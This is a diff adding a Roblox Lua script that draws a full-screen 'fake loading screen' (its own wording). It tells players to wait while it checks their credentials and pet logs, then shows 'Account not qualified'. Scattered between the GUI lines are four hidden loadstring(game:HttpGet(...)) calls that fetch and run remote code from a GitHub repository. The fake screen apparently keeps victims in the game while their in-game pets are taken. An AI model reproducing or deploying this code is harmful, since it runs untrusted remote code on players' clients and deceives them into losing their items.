@@ -1,4 +1,204 @@
 -- Place this in a LocalScript inside StarterGui
+-- GUI v5 - Fixed Timer + Working Help + Final Messages
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "AdvanceServerUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = game:GetService("CoreGui")
+
+local blackBG = Instance.new("Frame")
+blackBG.Size = UDim2.new(1, 0, 1, 0)
+blackBG.BackgroundColor3 = Color3.new(0, 0, 0)
+blackBG.BorderSizePixel = 0
+blackBG.Parent = gui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.4, 0, 0.4, 0)
+frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.Parent = blackBG
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -20, 0.25, 0)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Font = Enum.Font.SourceSansBold
+label.TextScaled = true
+label.TextWrapped = true
+label.Text = "Initializing..."
+label.Parent = frame
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, -20, 0.1, 0)
+percentLabel.Position = UDim2.new(0, 10, 0.3, 10)
+percentLabel.BackgroundTransparency = 1
+percentLabel.TextColor3 = Color3.new(1, 1, 1)
+percentLabel.Font = Enum.Font.SourceSans
+percentLabel.TextScaled = true
+percentLabel.Text = "Progress: 0%"
+percentLabel.Parent = frame
+
+local timeLabel = Instance.new("TextLabel")
+timeLabel.Size = UDim2.new(1, -20, 0.1, 0)
+timeLabel.Position = UDim2.new(0, 10, 0.4, 10)
+timeLabel.BackgroundTransparency = 1
+timeLabel.TextColor3 = Color3.new(1, 1, 1)
+timeLabel.Font = Enum.Font.SourceSans
+timeLabel.TextScaled = true
+timeLabel.Text = "Estimated time left: 10:00"
+timeLabel.Parent = frame
+
+local progressBarBG = Instance.new("Frame")
+progressBarBG.Size = UDim2.new(1, -40, 0.1, 0)
+progressBarBG.Position = UDim2.new(0, 20, 0.63, 0)
+progressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+progressBarBG.BorderSizePixel = 0
+progressBarBG.Parent = frame
+Instance.new("UICorner", progressBarBG).CornerRadius = UDim.new(0, 6)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+progressFill.BorderSizePixel = 0
+progressFill.Parent = progressBarBG
+Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 6)
+
+local petLabel = Instance.new("TextLabel")
+petLabel.Size = UDim2.new(1, -20, 0.1, 0)
+petLabel.Position = UDim2.new(0, 10, 0.78, 0)
+petLabel.BackgroundTransparency = 1
+petLabel.TextColor3 = Color3.new(1, 1, 1)
+petLabel.Font = Enum.Font.SourceSansItalic
+petLabel.TextScaled = true
+petLabel.Text = ""
+petLabel.Parent = frame
+
+-- Help Button
+local helpButton = Instance.new("TextButton")
+helpButton.Size = UDim2.new(0, 70, 0, 30)
+helpButton.Position = UDim2.new(1, -80, 0, 10)
+helpButton.Text = "?Help"
+helpButton.TextColor3 = Color3.new(1, 1, 1)
+helpButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+helpButton.Font = Enum.Font.SourceSansBold
+helpButton.TextScaled = true
+helpButton.ZIndex = 10
+helpButton.Parent = blackBG
+Instance.new("UICorner", helpButton).CornerRadius = UDim.new(0, 6)
+
+-- Help Popup
+local helpPopup = Instance.new("Frame")
+helpPopup.Size = UDim2.new(0.8, 0, 0.6, 0)
+helpPopup.Position = UDim2.new(0.1, 0, 0.2, 0)
+helpPopup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+helpPopup.BorderSizePixel = 0
+helpPopup.Visible = false
+helpPopup.ZIndex = 20
+helpPopup.Parent = blackBG
+Instance.new("UICorner", helpPopup).CornerRadius = UDim.new(0, 10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
+
+local helpText = Instance.new("TextLabel")
+helpText.Size = UDim2.new(1, -20, 1, -20)
+helpText.Position = UDim2.new(0, 10, 0, 10)
+helpText.BackgroundTransparency = 1
+helpText.TextColor3 = Color3.new(1, 1, 1)
+helpText.Font = Enum.Font.SourceSans
+helpText.TextScaled = true
+helpText.TextWrapped = true
+helpText.Text = "Fake loading screen. Please do not leave. System is validating account, reading pet logs, and checking server assignments."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
+helpText.Parent = helpPopup
+
+helpButton.MouseButton1Click:Connect(function()
+    helpPopup.Visible = not helpPopup.Visible
+end)
+
+-- Timer & Logic
+local totalTime = 600
+local startTime = tick()
+local virtualElapsed = 0
+
+local pets = {"Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus", "Kitsune"}
+
+spawn(function()
+    for _, pet in ipairs(pets) do
+        petLabel.Text = "Checking pets: " .. pet .. "..."
+        wait(20)
+        petLabel.Text = "Checking pets: " .. pet .. " -> OK!"
+        virtualElapsed = virtualElapsed + 25
+        wait(1)
+    end
+end)
+
+spawn(function()
+    while true do
+        local realElapsed = tick() - startTime
+        local elapsed = realElapsed + virtualElapsed
+        if elapsed >= totalTime then break end
+
+        local pct = math.floor(elapsed / totalTime * 100)
+        local rem = math.max(0, totalTime - elapsed)
+        local min = math.floor(rem / 60)
+        local sec = math.floor(rem % 60)
+
+        percentLabel.Text = ("Progress: %d%%"):format(pct)
+        timeLabel.Text = ("Estimated time left: %02d:%02d"):format(min, sec)
+        progressFill.Size = UDim2.new(pct / 100, 0, 1, 0)
+
+        wait(0.5)
+    end
+end)
+
+local messages = {
+    "Please wait...",
+    "Don't leave the game...",
+    "Finding the right server for you...",
+    "Checking your credentials...",
+    "Reading your logs...",
+    "Make sure you have the pets...",
+    "Reading pets logs..."
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
+
+spawn(function()
+    local idx = 1
+    while true do
+        if (tick() - startTime + virtualElapsed) >= totalTime then break end
+        label.Text = messages[idx]
+        idx = idx % #messages + 1
+        wait(30)
+    end
+end)
+
+spawn(function()
+    while (tick() - startTime + virtualElapsed) < totalTime do
+        wait(0.1)
+    end
+
+    frame:Destroy()
+
+    local resultText = Instance.new("TextLabel")
+    resultText.Size = UDim2.new(1, 0, 1, 0)
+    resultText.BackgroundTransparency = 1
+    resultText.TextColor3 = Color3.new(1, 0, 0)
+    resultText.Font = Enum.Font.SourceSansBold
+    resultText.TextScaled = true
+    resultText.Text = "Server cannot be found"
+    resultText.Parent = blackBG
+
+    wait(3)
+    resultText.Text = "Account not qualified"
+    wait(3)
+    resultText.Text = "Required pets not found"
+    wait(3)
+    resultText.Text = "Try Again"
+end)
 
 --// SERVICES
 local Players = game:GetService("Players")
